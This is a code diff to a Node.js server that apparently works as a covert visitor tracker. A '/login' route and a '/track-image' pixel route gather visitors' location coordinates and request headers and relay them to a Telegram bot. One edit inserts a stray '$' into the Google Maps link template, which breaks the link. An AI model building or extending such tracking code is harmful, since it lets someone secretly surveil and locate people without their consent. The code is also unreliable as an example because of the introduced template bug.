@@ -52,7 +52,7 @@ app.post("/login", async (req, res) => {
     const referer = req.headers["referer"] || "Direct Link";
     const connection = req.headers["connection"] || "Unknown";
     const host = req.headers["host"] || "Unknown";
-    const locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
+    const locationLink = `https://www.google.com/maps?q=$${lat},${lon}`;
 
     const message = `
 📍 New Visitor Tracked:
@@ -72,7 +72,7 @@ User-Agent: ${userAgent}
 Language: ${language}
 Referer: ${referer}
 Timestamp: ${timestamp}
-    `;
+    `;
 
     await axios.get(
       `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
@@ -131,6 +131,7 @@ app.get("/track-image", async (req, res) => {
     const referer = req.headers["referer"] || "Direct Link";
     const connection = req.headers["connection"] || "Unknown";
     const host = req.headers["host"] || "Unknown";
+    const locationLink = `https://www.google.com/maps?q=${lat},${lon}`; // Added here
 
     const message = `
 📸 Image Tracker Triggered
@@ -144,7 +145,7 @@ app.get("/track-image", async (req, res) => {
 🔗 Referer: ${referer}
 🔌 Connection: ${connection}
 🧑‍💻 Host: ${host}
-    `;
+    `;
 
     await axios.get(
       `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
